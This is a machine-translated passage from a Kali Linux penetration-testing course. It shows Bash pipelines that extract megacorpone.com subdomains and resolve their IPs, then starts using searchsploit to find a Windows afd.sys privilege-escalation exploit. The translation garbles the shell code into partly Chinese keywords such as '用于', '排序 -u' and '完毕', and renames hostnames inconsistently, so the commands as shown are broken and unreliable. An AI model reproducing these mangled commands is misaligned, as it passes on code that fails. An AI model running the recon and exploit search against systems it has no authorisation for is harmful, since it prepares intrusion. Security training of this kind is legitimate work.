<div style="position:absolute;top:145575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将分隔符设置为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“/”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）并打印第一个字段（使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f 1</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），只留下完整的</font></font></nobr></div>
<div style="position:absolute;top:145595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子域名：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:145630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep "href=" index.html | </font><font style="vertical-align: inherit;">grep "\.megacorpone" | </font><font style="vertical-align: inherit;">grep -v "www\.megacorpon</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:145647;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e\.com" | awk -F "http://" '{print $2}' | cut -d "/" -f 1</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:145664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">admin.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:145681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内网.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:145697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:145715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail2.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:145732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">暹粒.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:145749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">support.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:145765;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:145785;left:346"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 174 - 切割域名</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:145814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这看起来很棒！</font><font style="vertical-align: inherit;">但是，任何 Bash 大师都会看一眼我们的工作并嗤之以鼻。</font><font style="vertical-align: inherit;">这是应得的</font></font></nobr></div>
<div style="position:absolute;top:145833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为我们以笨拙的方式使用了基本工具，即使我们的减少相当合理。</font></font></nobr></div>
<div style="position:absolute;top:145853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 及其相关命令和内置程序非常强大，而且总是有更多</font></font></nobr></div>
<div style="position:absolute;top:145872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学习。</font></font></nobr></div>
<div style="position:absolute;top:145905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们为了改进而批评我们的工作（我们应该总是这样做），我们可能会看到</font></font></nobr></div>
<div style="position:absolute;top:145925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些简单的改进方法。</font><font style="vertical-align: inherit;">首先，我们从</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“href=”</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始搜索</font><font style="vertical-align: inherit;">，然后搜索</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:145944;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http:// </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这些本质上都是链接，但这要求每一行都有两个字符串。</font><font style="vertical-align: inherit;">如果一条线</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:145963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，但没有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“href=”</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们会错过一行。</font><font style="vertical-align: inherit;">应避免冗余，</font></font></nobr></div>
<div style="position:absolute;top:145982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尤其是在处理大文件时。</font><font style="vertical-align: inherit;">此外，我们并不真正关心链接，不一定，</font></font></nobr></div>
<div style="position:absolute;top:146002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在寻找以“.megacorpone.com”结尾的子域，无论</font></font></nobr></div>
<div style="position:absolute;top:146021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考包含在链接中。</font></font></nobr></div>
<div style="position:absolute;top:146054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一件要考虑的事情是，我们花了很多时间和精力来削减结果，</font></font></nobr></div>
<div style="position:absolute;top:146074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查找并划分子域名。</font><font style="vertical-align: inherit;">这很笨拙，容易出错，而且当</font></font></nobr></div>
<div style="position:absolute;top:146093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式良好的正则表达式搜索可以轻松处理这个问题。</font><font style="vertical-align: inherit;">我们已经提到了</font></font></nobr></div>
<div style="position:absolute;top:146112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">之前的正则表达式，但现在我们已经采取了艰难的路线，让我们看一个实际的例子</font></font></nobr></div>
<div style="position:absolute;top:146132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到这个问题的解决方案。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:146299;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="124"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 124 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:146332;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:147409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:147409;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:147409;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">124</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:146428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，我们将使用一个简单的正则表达式来雕刻“.megacorpone.com”子域</font></font></nobr></div>
<div style="position:absolute;top:146447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从我们的文件中：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:146482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep -o '[^/]*\.megacorpone\.com' index.html | </font><font style="vertical-align: inherit;">排序 -u &gt; list.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:146516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat list.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:146533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">admin.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:146550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">beta.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:146567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内网.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:146584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail2.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:146601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:146618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">暹粒.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:146635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">support.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:146652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:146671;left:282"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 175 - 使用正则表达式的更优雅的解决方案</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:146700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该解决方案非常紧凑，但引入了一些新技术。</font><font style="vertical-align: inherit;">首先，注意</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep -o</font></font></font></b></nobr></div>
<div style="position:absolute;top:146720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项，它只返回在我们的正则表达式中定义的字符串。</font><font style="vertical-align: inherit;">如果我们形成我们的表达</font></font></nobr></div>
<div style="position:absolute;top:146739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小心，这个单一的命令将处理我们之前的大部分数据雕刻。</font><font style="vertical-align: inherit;">表达式本身</font></font></nobr></div>
<div style="position:absolute;top:146759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看起来很复杂，但相当简单。</font></font></nobr></div>
<div style="position:absolute;top:146791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们要搜索的字符串 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'[^/]*\.megacorpone\.com'</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 用单引号括起来，</font></font></nobr></div>
<div style="position:absolute;top:146811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如我们所提到的，它不允许变量扩展并将处理所有封闭的字符</font></font></nobr></div>
<div style="position:absolute;top:146830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字面上地。</font></font></nobr></div>
<div style="position:absolute;top:146863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表达式 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[^/]*</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 中</font><font style="vertical-align: inherit;">的第一个块</font><font style="vertical-align: inherit;">是一个否定 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 集 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[ ]</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，它搜索任何数字</font></font></nobr></div>
<div style="position:absolute;top:146882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符 ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 不包括正斜杠。</font><font style="vertical-align: inherit;">请注意，句点是用</font></font></nobr></div>
<div style="position:absolute;top:146902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反斜杠 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\.</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 以强调我们正在寻找一个字面句点。</font><font style="vertical-align: inherit;">接下来，字符串必须以</font></font></nobr></div>
<div style="position:absolute;top:146921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“.megacorpone.com”。</font><font style="vertical-align: inherit;">当 grep 找到匹配的字符串时，它会从行中雕刻并返回它。</font></font></nobr></div>
<div style="position:absolute;top:146954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了以后使用，我们可以将其他字符包含在否定列表中，方法是将它们包含在逗号中 -</font></font></nobr></div>
<div style="position:absolute;top:146973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分隔列表。</font><font style="vertical-align: inherit;">此块 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[^/,"]*</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 将排除正斜杠和双引号</font></font></nobr></div>
<div style="position:absolute;top:146993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符，例如。</font></font></nobr></div>
<div style="position:absolute;top:147025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是很多新材料，看起来势不可挡，但这是一个很好的可重复使用的常规材料</font></font></nobr></div>
<div style="position:absolute;top:147045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在正斜杠后找到以“.megacorpone.com”结尾的任何字符串的表达式，以及</font></font></nobr></div>
<div style="position:absolute;top:147064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽职尽责地划分出 URL 引用的子域。</font><font style="vertical-align: inherit;">我们稍后可以重用这个正则表达式来</font></font></nobr></div>
<div style="position:absolute;top:147083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从文件中雕刻任意数量的字符串。</font></font></nobr></div>
<div style="position:absolute;top:147116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以用这个正则表达式做更多的事情，但这是一个很好的开始，也是一个很好的例子</font></font></nobr></div>
<div style="position:absolute;top:147136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为什么正则表达式如此有价值。</font></font></nobr></div>
<div style="position:absolute;top:147168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们有一个从 megacorpone.com 的首页链接的漂亮、干净的域名列表。</font></font></nobr></div>
<div style="position:absolute;top:147188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来发现文中各个域名对应的IP地址</font></font></nobr></div>
<div style="position:absolute;top:147207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件。</font><font style="vertical-align: inherit;">我们可以为此使用 Bash 单行循环：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:147242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于 $(cat list.txt) 中的 url；</font><font style="vertical-align: inherit;">做主机 $url; </font><font style="vertical-align: inherit;">完毕</font></font></font></b></nobr></div>
<div style="position:absolute;top:147259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">admin.megacorpone.com 的地址为 38.100.193.83</font></font></nobr></div>
<div style="position:absolute;top:147276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">beta.megacorpone.com 的地址为 38.100.193.88</font></font></nobr></div>
<div style="position:absolute;top:147293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">intranet.megacorpone.com 的地址为 38.100.193.87</font></font></nobr></div>
<div style="position:absolute;top:147310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail2.megacorpone.com 的地址为 38.100.193.73</font></font></nobr></div>
<div style="position:absolute;top:147329;left:277"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 176 - 使用 host 命令查找 IP 地址 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:147487;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="125"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 125 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:147520;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:148597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:148597;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:148597;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">125</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:147616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令给我们输出的种种不是所有的相关的和。</font><font style="vertical-align: inherit;">我们将提取IP</font></font></nobr></div>
<div style="position:absolute;top:147635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过将输出管道</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到“具有地址”</font><font style="vertical-align: inherit;">的</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">grep 中</font></font></b><font style="vertical-align: inherit;">来获取地址，然后</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">剪切</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果并对其进行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">排序</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:147670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于 $(cat list.txt) 中的 url；</font><font style="vertical-align: inherit;">做主机 $url; </font><font style="vertical-align: inherit;">完成 | </font><font style="vertical-align: inherit;">grep "有地址" | </font><font style="vertical-align: inherit;">切</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:147687;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d " " -f 4 | </font><font style="vertical-align: inherit;">排序 -u</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:147704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">173.246.47.170</font></font></nobr></div>
<div style="position:absolute;top:147721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.100.193.66</font></font></nobr></div>
<div style="position:absolute;top:147738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.100.193.67</font></font></nobr></div>
<div style="position:absolute;top:147755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.100.193.73</font></font></nobr></div>
<div style="position:absolute;top:147772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.100.193.76</font></font></nobr></div>
<div style="position:absolute;top:147789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.100.193.77</font></font></nobr></div>
<div style="position:absolute;top:147806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.100.193.79</font></font></nobr></div>
<div style="position:absolute;top:147823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.100.193.83</font></font></nobr></div>
<div style="position:absolute;top:147840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.100.193.84</font></font></nobr></div>
<div style="position:absolute;top:147857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.100.193.87</font></font></nobr></div>
<div style="position:absolute;top:147874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.100.193.88</font></font></nobr></div>
<div style="position:absolute;top:147891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.100.193.89</font></font></nobr></div>
<div style="position:absolute;top:147910;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 177 - 仅提取 IP 地址</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:147939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好的！</font><font style="vertical-align: inherit;">我们从网页中提取了“.megacorpone.com”子域并获得了</font></font></nobr></div>
<div style="position:absolute;top:147959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对应的 IP 地址。</font><font style="vertical-align: inherit;">正如我们所见，我们可以通过多种方式处理数据</font></font></nobr></div>
<div style="position:absolute;top:147978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 和相关实用程序，以及正则表达式，这强化了这样一个事实</font></font></nobr></div>
<div style="position:absolute;top:147997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">深入研究这些主题的任何时间都将节省大量处理数据或</font></font></nobr></div>
<div style="position:absolute;top:148017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加快未来的进程。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:148051;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.7.2 实际的 Bash 用法——示例 2</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:148089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，让我们假设我们正在进行渗透测试并且没有特权</font></font></nobr></div>
<div style="position:absolute;top:148109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问 Windows 计算机。</font><font style="vertical-align: inherit;">随着我们继续收集信息，我们意识到这可能是</font></font></nobr></div>
<div style="position:absolute;top:148128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">容易受到我们读到的以字母 a、f 和 d 开头的漏洞利用，但我们不能</font></font></nobr></div>
<div style="position:absolute;top:148147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记住漏洞利用的全名。</font><font style="vertical-align: inherit;">为了提升我们的权限，我们想要搜索</font></font></nobr></div>
<div style="position:absolute;top:148167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于那个特定的漏洞。</font></font></nobr></div>
<div style="position:absolute;top:148199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们需要在 https://www.exploit-db.com 中搜索“afd windows”，下载</font></font></nobr></div>
<div style="position:absolute;top:148219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与我们的搜索条件匹配的漏洞利用，并检查它们，直到找到合适的漏洞。</font><font style="vertical-align: inherit;">我们可以做</font></font></nobr></div>
<div style="position:absolute;top:148238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是通过网站手动完成的，这不会花费太长时间，但是如果我们花时间写一个</font></font></nobr></div>
<div style="position:absolute;top:148257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 脚本，我们可以轻松地使用它来搜索并在以后自动下载漏洞。</font></font></nobr></div>
<div style="position:absolute;top:148290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用我们现在对脚本的了解，让我们尝试自动执行此任务。</font></font></nobr></div>
<div style="position:absolute;top:148323;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将从</font><font style="vertical-align: inherit;">Kali Linux 上</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SearchSploit </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">132</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序</font><font style="vertical-align: inherit;">开始</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">SearchSploit 是一个命令行搜索工具</font></font></nobr></div>
<div style="position:absolute;top:148342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于 Exploit-DB，它允许我们在任何地方随身携带 Exploit Database 的离线副本</font></font></nobr></div>
<div style="position:absolute;top:148362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">去。</font><font style="vertical-align: inherit;">我们将“afd windows”作为搜索字符串传递，使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-w</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 https://www.exploit- 的 URL-</font></font></nobr></div>
<div style="position:absolute;top:148381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">db.com 而不是本地路径，并</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-t</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索漏洞利用标题：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:148416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit afd windows -w -t</font></font></font></b></nobr></div>
<div style="position:absolute;top:148433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ---------------------</font></font></nobr></div>
<div style="position:absolute;top:148450;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用标题    </font></font></nobr></div>
<div style="position:absolute;top:148450;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">网址</font></font></nobr></div>
<div style="position:absolute;top:148467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ---------------------</font></font></nobr></div>
<div style="position:absolute;top:148484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows (x86) - 'afd.sys' 特权 | </font><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/40564</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:148547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">132 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://www.exploit-db.com/searchsploit/</font></font></font></nobr></div>
</span></font>

